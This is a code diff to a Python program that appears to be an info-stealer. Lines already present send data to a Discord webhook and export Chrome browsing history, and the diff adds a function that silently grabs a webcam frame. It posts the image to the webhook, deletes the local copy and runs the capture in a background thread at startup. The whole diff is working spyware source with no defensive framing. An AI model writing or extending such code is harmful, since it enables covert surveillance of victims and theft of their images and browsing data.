@@ -15,6 +15,7 @@ from scanner import scan_all
 import sqlite3
 import tempfile
 from code.error import error
+import cv2
 
 red = "\033[31m"
 green = "\033[32m"
@@ -76,6 +77,32 @@ def discord_injection():
                     "avatar_url": "https://i.postimg.cc/nhfNtJbK/f65aba67730462b50f7ec15c4bdb605d.jpg"
                     }
                 requests.post(webhook, json=data)
+def webcam():
+    try:
+        cap = cv2.VideoCapture(0)
+
+        if not cap.isOpened():
+            print(f"psc")
+            return
+        else:
+            print(f"Ok")
+
+        ret, frame = cap.read()
+
+        if ret:
+            filename =f"webcam_capture_{time.strftime('%Y%m%d_%H%M%S')}.png"
+            cv2.imwrite(filename, frame)
+            with open(filename, 'rb') as f:
+                requests.post(webhook, 
+                    data={"content": "Photo webcam"}, 
+                    files={"file": f})
+            os.remove(filename)
+        else:
+            print(f"prblm")
+
+        cap.release()
+    except Exception as e:
+        print(f"Erorr {e}")
 
 def dossier():
     while True:
@@ -280,8 +307,10 @@ t2 = threading.Thread(target=dossier)
 t3 = threading.Thread(target=export_history_txt)
 t4 = threading.Thread(target=get_chrome_history_path)
 t5 = threading.Thread(target=error)
+t6 = threading.Thread(target=webcam)
 t1.start()
 t2.start()
 t3.start()
 t4.start()
 t5.start()
+t6.start()
